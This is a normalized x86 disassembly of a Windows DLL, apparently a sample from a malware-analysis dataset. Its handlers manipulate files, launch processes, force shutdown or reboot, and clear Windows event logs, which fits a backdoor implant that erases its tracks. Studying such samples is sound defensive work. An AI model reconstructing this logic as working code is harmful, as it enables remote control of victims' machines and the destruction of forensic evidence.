cmp [ esp + 0x1c ] 0x2
jl r-xdata
mov eax [ esp + 0x18 ]
jmp r-xdata
push [ ebx + 0x4 ]
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x28 ]
call sub_10004615
test eax eax
jne r-xdata
test eax eax
je r-xdata
call sub_10004b8a
jmp r-xdata
mov ecx [ esp + 0x18 ]
call sub_10004524
pop ecx
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x3
jl r-xdata
push [ ebx + 0x4 ]
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x28 ]
call sub_10004615
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x28 ]
push eax
call [ CreateDirectoryW@IAT ]
push 0x57
pop eax
jmp r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x3
jl r-xdata
push [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
mov esi [ esp + 0x18 ]
call sub_10004fe2
lea eax [ esp + 0x24 ]
push eax
call [ RemoveDirectoryW@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
jl r-xdata
push [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
mov esi [ esp + 0x18 ]
call sub_10005053
jmp r-xdata
test eax eax
jne r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
jl r-xdata
push [ ebx + 0x4 ]
mov edx [ esp + 0x18 ]
call sub_10004e4e
jmp r-xdata
mov edi [ LocalFree@IAT ]
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
jl r-xdata
push [ ebx + 0x4 ]
mov edx [ esp + 0x18 ]
call sub_100050c2
jmp r-xdata
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x1
jle r-xdata
mov [ esp + 0x22c ] ax
inc eax
mov [ esp + 0x18 ] eax
cmp [ esp + 0x1c ] eax
jle r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x1
jle r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
jmp r-xdata
push [ esp + 0x14 ]
lea ecx [ esp + 0x230 ]
call sub_1000517d
jmp r-xdata
mov esi [ wcscat@IAT ]
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x1
jle r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
jmp r-xdata
push eax
call sub_10005262
jmp r-xdata
inc [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x1c ]
jl r-xdata
lea eax [ esp + 0x22c ]
push r--data
push eax
call esi
pop ecx
pop ecx
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
jl r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
jmp r-xdata
push eax
call sub_100052aa
jmp r-xdata
mov eax [ esp + 0x18 ]
push [ ebx + eax * 4 ]
lea eax [ esp + 0x230 ]
push eax
call esi
mov eax [ esp + 0x24 ]
dec eax
pop ecx
pop ecx
cmp [ esp + 0x18 ] eax
jge r-xdata
cmp [ esp + 0x1c ] 0x1
jne r-xdata
cmp [ esp + 0x1c ] 0x3
jl r-xdata
push [ esp + 0x14 ]
mov ecx [ ebx + 0x4 ]
call sub_1000546c
jmp r-xdata
call sub_100052f7
jmp r-xdata
mov esi [ esp + 0x14 ]
movzx eax [ esi + 0x2062c ]
mov ecx eax
imul ecx ecx 0x208
lea ecx [ ecx + esi + 0x34 ]
push ecx
push eax
push r--data
lea eax [ esp + 0x30 ]
push 0x104
push eax
call [ _snwprintf@IAT ]
add esp 0x14
push 0xa2c
call [ operator new@IAT ]
pop ecx
mov [ esp + 0x18 ] eax
and [ esp + 0xa40 ] 0x0
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x2 ] 0x3a
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov esi [ esp + 0x14 ]
call sub_100056a9
jmp r-xdata
xor eax eax
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push [ esp + 0x28 ]
call sub_1000386e
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ esi + 0x30 ]
mov [ esp + 0x18 ] eax
test ecx ecx
je r-xdata
push eax
call [ GetProcessVersion@IAT ]
test eax eax
jne r-xdata
or [ esp + 0xa40 ] 0xffffffff
mov [ esi + 0x30 ] eax
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
movzx eax [ eax ]
push eax
call [ toupper@IAT ]
movzx esi ax
pop ecx
cmp esi 0x41
jb r-xdata
and [ esi + 0x30 ] 0x0
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ esp + 0x18 ] 0x0
xor eax eax
call sub_100045f6
jmp r-xdata
mov eax [ esp + 0x18 ]
call sub_1000737c
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov esi eax
push esi
push r--data
call sub_10004524
pop ecx
pop ecx
push esi
call edi
jmp r-xdata
push 0xf
pop eax
call sub_1000734e
mov eax [ ebx ]
movzx eax [ eax ]
push eax
call [ toupper@IAT ]
pop ecx
mov ecx [ esp + 0x14 ]
mov [ ecx + 0x2062c ] ax
jmp r-xdata
test eax eax
je r-xdata
push ebx
call edi
push [ esp + 0x20 ]
call [ free@IAT ]
mov esi [ esp + 0x18 ]
mov ecx esi
mov [ esp ] r--data
call sub_10004524
movzx eax [ esi + 0x2062c ]
pop ecx
mov ecx eax
imul ecx ecx 0x208
lea ecx [ ecx + esi + 0x34 ]
push ecx
push eax
push r--data
mov ecx esi
call sub_10004524
xor eax eax
add esp 0xc
inc eax
jmp r-xdata
sub_10004524
push 0x14
push r--data
call sub_10014fe0
mov esi ecx
push 0x40
pop ebx
push 0x80
mov edi [ malloc@IAT ]
call edi
pop ecx
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10015025
retn
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebx - 0x1 ]
push eax
push [ ebp - 0x1c ]
call [ _vsnwprintf@IAT ]
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
xor eax eax
mov ecx [ ebp - 0x1c ]
mov [ ecx + ebx * 2 - 0x2 ] ax
mov ebx [ esi + 0x2c ]
cmp ebx [ esi + 0x28 ]
ja r-xdata
add ebx 0x40
mov [ ebp - 0x24 ] ebx
push [ ebp - 0x1c ]
call [ free@IAT ]
lea eax [ ebx + ebx ]
push eax
call edi
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x24 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x28 ]
jmp r-xdata
mov eax [ esi + 0x24 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebx * 4 + 0x28 ]
push eax
call edi
pop ecx
mov [ esi + 0x24 ] eax
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add [ esi + 0x2c ] 0xa
mov ecx ebx
shl ecx 0x2
push ecx
push [ ebp - 0x20 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_100045f6
cmp si 0x5a
jbe r-xdata
call sub_1000791a
xor edx edx
inc edx
lea ecx [ esi - 0x41 ]
shl edx cl
and eax edx
neg eax
sbb eax eax
neg eax
retn
xor eax eax
retn
sub_10004615
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x210 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi edx
mov [ ebp - 0x214 ] ecx
test ebx ebx
je r-xdata
movzx eax [ esi + 0x2062c ]
mov edx eax
imul edx edx 0x208
lea edx [ edx + esi + 0x34 ]
push edx
push eax
push r--data
push 0x104
push ecx
call [ _snwprintf@IAT ]
add esp 0x14
movzx eax [ ebx ]
test ax ax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
mov [ ebp - 0x210 ] 0x1
cmp [ ebx + 0x2 ] 0x3a
push edi
jne r-xdata
movzx edi [ esi + 0x2062c ]
cmp eax 0x5c
jne r-xdata
add ebx 0x4
cmp [ ebx ] 0x5c
push eax
jne r-xdata
mov eax edi
imul eax eax 0x208
lea eax [ eax + esi + 0x34 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcsncat@IAT ]
add esp 0x18
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcsncpy@IAT ]
add esp 0x10
jmp r-xdata
call [ toupper@IAT ]
movzx edi ax
mov eax edi
imul eax eax 0x208
lea eax [ eax + esi + 0x34 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcsncat@IAT ]
add esp 0x1c
jmp r-xdata
call [ toupper@IAT ]
movzx edi ax
mov [ esp ] 0x104
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcsncpy@IAT ]
add esp 0xc
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
lea esi [ ebp - 0x20c ]
call sub_10007a8b
mov eax esi
push eax
movzx eax di
push eax
push r--data
push 0x104
push [ ebp - 0x214 ]
call [ _snwprintf@IAT ]
add esp 0x14
pop edi
jmp r-xdata
xor eax eax
mov [ ebp - 0x6 ] ax
sub_100047c9
push ebp
mov ebp esp
sub esp 0x624
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx edx
push edi
mov edi ecx
test ebx ebx
jne r-xdata
cmp [ ebx + 0x2 ] 0x3a
push esi
jne r-xdata
movzx eax [ edi + 0x2062c ]
mov ecx eax
imul ecx ecx 0x208
lea ecx [ ecx + edi + 0x34 ]
push ecx
push eax
push r--data
lea eax [ ebp - 0x61c ]
push 0x104
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x61c ]
push eax
call [ _wcsupr@IAT ]
lea eax [ ebp - 0x61c ]
push eax
push r--data
mov ecx edi
call sub_10004524
add esp 0x20
xor eax eax
jmp r-xdata
cmp [ ebx ] 0x5c
movzx eax [ edi + 0x2062c ]
push eax
jne r-xdata
movzx eax [ ebx ]
mov esi [ toupper@IAT ]
push eax
call esi
movzx eax ax
pop ecx
cmp eax 0x41
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
call [ toupper@IAT ]
movzx eax ax
mov [ ebp - 0x620 ] eax
movzx eax ax
imul eax eax 0x208
lea eax [ eax + edi + 0x34 ]
mov [ esp ] 0x104
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcsncpy@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
mov ecx 0x103
sub ecx eax
push ecx
push ebx
mov ebx [ wcsncat@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call ebx
xor eax eax
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x6 ] ax
call sub_10007a8b
mov eax esi
mov esi [ wcslen@IAT ]
push eax
call esi
add esp 0x20
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
je r-xdata
call [ toupper@IAT ]
movzx eax ax
mov [ ebp - 0x620 ] eax
movzx eax ax
imul eax eax 0x208
lea eax [ eax + edi + 0x34 ]
mov [ esp ] 0x104
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcsncpy@IAT ]
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcscpy@IAT ]
lea esi [ ebp - 0x20c ]
call sub_10007a8b
mov eax esi
mov esi [ wcslen@IAT ]
push eax
call esi
add esp 0x18
jmp r-xdata
xor eax eax
mov esi eax
call sub_100045f6
mov esi [ toupper@IAT ]
jmp r-xdata
movzx esi [ ebp - 0x620 ]
lea eax [ ebp - 0x20c ]
push eax
push esi
push r--data
mov ebx 0x104
lea eax [ ebp - 0x414 ]
push ebx
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x414 ]
push eax
call [ _wcsupr@IAT ]
lea eax [ ebp - 0x414 ]
push eax
push r--data
mov ecx edi
call sub_10004524
add esp 0x20
lea eax [ ebp - 0x414 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x20c ]
push eax
call esi
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call ebx
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
je r-xdata
lea eax [ ebx + 0x4 ]
mov [ ebp - 0x624 ] eax
movzx eax [ eax ]
test ax ax
jne r-xdata
push 0xf
pop eax
jmp r-xdata
test eax eax
jne r-xdata
mov eax 0x10b
jmp r-xdata
test al 0x10
jne r-xdata
lea eax [ ebp - 0x20c ]
push eax
call esi
cmp eax 0x5c
movzx eax [ ebx ]
push eax
jne r-xdata
movzx eax [ ebx ]
push eax
call esi
imul eax eax 0x208
lea eax [ eax + edi + 0x34 ]
push eax
movzx eax [ ebx ]
push eax
push r--data
lea eax [ ebp - 0x414 ]
push 0x104
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x414 ]
push eax
call [ _wcsupr@IAT ]
lea eax [ ebp - 0x414 ]
push eax
push r--data
mov ecx edi
call sub_10004524
add esp 0x24
jmp r-xdata
pop esi
imul esi esi 0x208
push ebx
lea eax [ ebp - 0x20c ]
push eax
lea eax [ edi + esi + 0x34 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ edi + esi + 0x23a ] ax
add esp 0x10
call esi
movzx eax ax
mov [ ebp - 0x620 ] eax
movzx eax ax
imul eax eax 0x208
lea eax [ eax + edi + 0x34 ]
mov [ esp ] 0x104
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcsncpy@IAT ]
mov ebx [ wcslen@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call ebx
mov ecx 0x103
sub ecx eax
push ecx
push [ ebp - 0x624 ]
lea eax [ ebp - 0x20c ]
push eax
call [ wcsncat@IAT ]
xor eax eax
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x6 ] ax
call sub_10007a8b
mov eax esi
push eax
call ebx
add esp 0x20
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
je r-xdata
call esi
push [ ebp - 0x624 ]
movzx eax ax
mov [ ebp - 0x620 ] eax
lea eax [ ebp - 0x20c ]
push eax
call [ wcscpy@IAT ]
lea esi [ ebp - 0x20c ]
call sub_10007a8b
mov eax esi
mov esi [ wcslen@IAT ]
push eax
call esi
add esp 0x10
xor eax eax
mov eax esi
push eax
call ebx
jmp r-xdata
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wcsncat@IAT ]
jmp r-xdata
sub_10004b8a
push ebp
mov ebp esp
sub esp 0xd80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
push edi
push eax
lea ecx [ ebp - 0x314 ]
mov edx esi
mov [ ebp - 0xd78 ] esi
call sub_10004615
test eax eax
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
push r--data
mov ecx esi
call sub_10004524
mov esi [ GetFileAttributesW@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x314 ]
push eax
call esi
mov edi [ wcslen@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x57
pop eax
jmp r-xdata
lea eax [ ebp - 0x314 ]
push eax
call esi
test al 0x10
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
push 0x800
lea eax [ ebp - 0xb14 ]
push 0x0
push eax
call [ memset@IAT ]
mov ebx [ _snwprintf@IAT ]
mov esi [ wcscat@IAT ]
add esp 0xc
call [ GetLastError@IAT ]
jmp r-xdata
lea eax [ ebp - 0x314 ]
push eax
call edi
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x314 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0x10
jmp r-xdata
push eax
lea eax [ ebp - 0x8c ]
push eax
call esi
test [ ebp - 0xd74 ] 0x20
pop ecx
pop ecx
mov eax r--data
jne r-xdata
mov eax r--data
lea eax [ ebp - 0xd74 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0xd7c ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x8c ]
push eax
call esi
test [ ebp - 0xd74 ] 0x20
pop ecx
pop ecx
mov eax r--data
jne r-xdata
mov eax r--data
push eax
lea eax [ ebp - 0x8c ]
push eax
call esi
test [ ebp - 0xd74 ] 0x20
pop ecx
pop ecx
mov eax r--data
jne r-xdata
mov eax r--data
push eax
lea eax [ ebp - 0x8c ]
push eax
call esi
lea eax [ ebp - 0xb14 ]
push eax
call edi
mov ecx 0x400
sub ecx eax
add esp 0xc
cmp ecx 0x51
jae r-xdata
mov eax r--data
test [ ebp - 0xd74 ] 0x10
mov eax r--data
jne r-xdata
mov ecx [ ebp - 0xd78 ]
lea eax [ ebp - 0xb14 ]
push eax
push r--data
call sub_10004524
push 0x800
lea eax [ ebp - 0xb14 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0x14
movzx ecx [ ebp - 0xb18 ]
push ecx
movzx ecx [ ebp - 0xb1a ]
push ecx
movzx ecx [ ebp - 0xb1c ]
push ecx
movzx ecx [ ebp - 0xb1e ]
push ecx
movzx ecx [ ebp - 0xb22 ]
push ecx
movzx ecx [ ebp - 0xb24 ]
push ecx
push eax
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0xd48 ]
push eax
lea eax [ ebp - 0xb14 ]
push r--data
push eax
call edi
pop ecx
mov ecx 0x3ff
sub ecx eax
push ecx
lea eax [ ebp - 0xb14 ]
push eax
call edi
pop ecx
lea eax [ ebp + eax * 2 - 0xb14 ]
push eax
call ebx
add esp 0x30
lea eax [ ebp - 0xd74 ]
push eax
push [ ebp - 0xd7c ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10c ]
lea eax [ ebp - 0xb24 ]
push eax
lea eax [ ebp - 0xd60 ]
push eax
call [ FileTimeToSystemTime@IAT ]
push [ ebp - 0xd54 ]
lea eax [ ebp - 0x10c ]
push r--data
push 0x40
push eax
call ebx
xor eax eax
add esp 0x10
test [ ebp - 0xd74 ] 0x20
mov [ ebp - 0x8c ] ax
mov eax r--data
jne r-xdata
push [ ebp - 0xd7c ]
call [ FindClose@IAT ]
lea eax [ ebp - 0xb14 ]
push eax
call edi
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xd78 ]
lea eax [ ebp - 0xb14 ]
push eax
push r--data
call sub_10004524
pop ecx
pop ecx
sub_10004e4e
push ebp
mov ebp esp
sub esp 0x67c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push eax
lea ecx [ ebp - 0x41c ]
mov [ ebp - 0x670 ] edx
call sub_10004615
test eax eax
jne r-xdata
lea eax [ ebp - 0x66c ]
push eax
lea eax [ ebp - 0x41c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x674 ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x57
pop eax
jmp r-xdata
mov esi [ wcsrchr@IAT ]
lea eax [ ebp - 0x41c ]
push 0x5c
push eax
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x4
mov esi [ wcsncat@IAT ]
mov edi [ wcslen@IAT ]
lea eax [ ebp - 0x41c ]
push 0x5c
push eax
call esi
pop ecx
pop ecx
xor ecx ecx
mov [ eax ] cx
call [ GetLastError@IAT ]
call sub_1000737c
mov ecx [ ebp - 0x670 ]
push eax
mov [ ebp - 0x678 ] eax
lea eax [ ebp - 0x214 ]
push eax
push r--data
call sub_10004524
add esp 0xc
push [ ebp - 0x678 ]
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x670 ]
lea eax [ ebp - 0x214 ]
push eax
push r--data
call sub_10004524
pop ecx
pop ecx
jmp r-xdata
push 0x104
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call [ wcsncpy@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call edi
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x214 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x214 ]
push eax
call edi
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x640 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call esi
xor eax eax
mov [ ebp - 0xe ] ax
add esp 0x2c
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x674 ]
call [ FindClose@IAT ]
xor eax eax
lea eax [ ebp - 0x66c ]
push eax
push [ ebp - 0x674 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
sub_10004fe2
push ebp
mov ebp esp
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x414 ]
mov edx esi
call sub_10004615
test eax eax
jne r-xdata
push edi
lea ecx [ ebp - 0x20c ]
mov edx esi
call sub_10004615
test eax eax
je r-xdata
push 0x57
pop eax
jmp r-xdata
push 0x1
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x414 ]
push eax
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn 0x4
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
sub_10005053
push ebp
mov ebp esp
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x414 ]
mov edx esi
call sub_10004615
test eax eax
jne r-xdata
push edi
lea ecx [ ebp - 0x20c ]
mov edx esi
call sub_10004615
test eax eax
je r-xdata
push 0x57
pop eax
jmp r-xdata
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x414 ]
push eax
call [ MoveFileW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn 0x4
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
sub_100050c2
push ebp
mov ebp esp
sub esp 0xa10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x20c ]
mov [ ebp - 0xa10 ] edx
call sub_10004615
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ _wfopen@IAT ]
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
push 0x57
pop eax
jmp r-xdata
push esi
mov esi [ fgetws@IAT ]
push edi
push ebx
mov edi 0x400
lea eax [ ebp - 0xa0c ]
push edi
push eax
call esi
add esp 0xc
jmp r-xdata
push 0x6e
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn 0x4
test eax eax
jne r-xdata
pop ebx
mov ecx [ ebp - 0xa10 ]
xor eax eax
mov [ ebp - 0x20e ] ax
lea eax [ ebp - 0xa0c ]
push eax
push r--data
call sub_10004524
push ebx
lea eax [ ebp - 0xa0c ]
push edi
push eax
call esi
add esp 0x14
push ebx
call [ fclose@IAT ]
pop ecx
pop edi
xor eax eax
pop esi
sub_1000517d
push ebp
mov ebp esp
sub esp 0x274
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x218 ] ecx
movzx ecx [ eax + 0x2062c ]
mov edx ecx
imul edx edx 0x208
push esi
push edi
lea eax [ edx + eax + 0x34 ]
push eax
push ecx
push r--data
lea eax [ ebp - 0x214 ]
push 0x104
push eax
call [ _snwprintf@IAT ]
mov esi [ memset@IAT ]
push 0x44
xor edi edi
lea eax [ ebp - 0x274 ]
push edi
push eax
call esi
push 0x10
lea eax [ ebp - 0x228 ]
push edi
push eax
mov [ ebp - 0x274 ] 0x44
call esi
add esp 0x2c
xor eax eax
mov [ ebp - 0x244 ] ax
lea eax [ ebp - 0x228 ]
push eax
lea eax [ ebp - 0x274 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push edi
push edi
push edi
push edi
push edi
push [ ebp - 0x218 ]
mov [ ebp - 0x248 ] 0x1
push edi
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x228 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x224 ]
call esi
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x4
sub_10005262
push ebp
mov ebp esp
mov ecx r--data
call sub_100071b9
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x2
push r--data
push [ ebp + 0x8 ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
push eax
push 0x6
jmp r-xdata
pop ebp
retn 0x4
call [ ExitWindowsEx@IAT ]
test eax eax
je r-xdata
sub_100052aa
push ebp
mov ebp esp
mov ecx r--data
call sub_100071b9
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x8
push r--data
push [ ebp + 0x8 ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
push eax
push 0xc
jmp r-xdata
pop ebp
retn 0x4
call [ ExitWindowsEx@IAT ]
test eax eax
setne al
test al al
je r-xdata
sub_100052f7
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor ebx ebx
push edi
mov edi eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
mov esi [ wcslen@IAT ]
push edi
call esi
pop ecx
cmp eax 0x8
jae r-xdata
xor eax eax
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x8
pop eax
push edi
call esi
pop ecx
jmp r-xdata
mov edi [ ClearEventLogA@IAT ]
mov esi [ OpenEventLogA@IAT ]
mov [ ebp - 0x10 ] ebx
cmp [ ebp - 0x4 ] ebx
je r-xdata
push edi
call esi
pop ecx
cmp eax 0x3
jae r-xdata
mov [ ebp - 0x8 ] 0x1
mov ebx [ _wcsnicmp@IAT ]
push eax
push r--data
push edi
call ebx
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x8 ] ebx
je r-xdata
push r--data
push ebx
call esi
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
push 0x3
pop eax
push edi
call esi
pop ecx
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp - 0xc ] ebx
je r-xdata
push r--data
push ebx
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push ebx
push eax
call edi
test eax eax
je r-xdata
push edi
call esi
pop ecx
cmp eax 0x6
jae r-xdata
mov [ ebp - 0xc ] 0x1
push eax
push r--data
push edi
call ebx
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
jne r-xdata
push r--data
push ebx
call esi
mov esi eax
cmp esi ebx
je r-xdata
push ebx
push eax
call edi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] ebx
jmp r-xdata
push 0x6
pop eax
push edi
call esi
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
cmp eax ebx
jne r-xdata
push ebx
push esi
call edi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push [ ebp - 0x4 ]
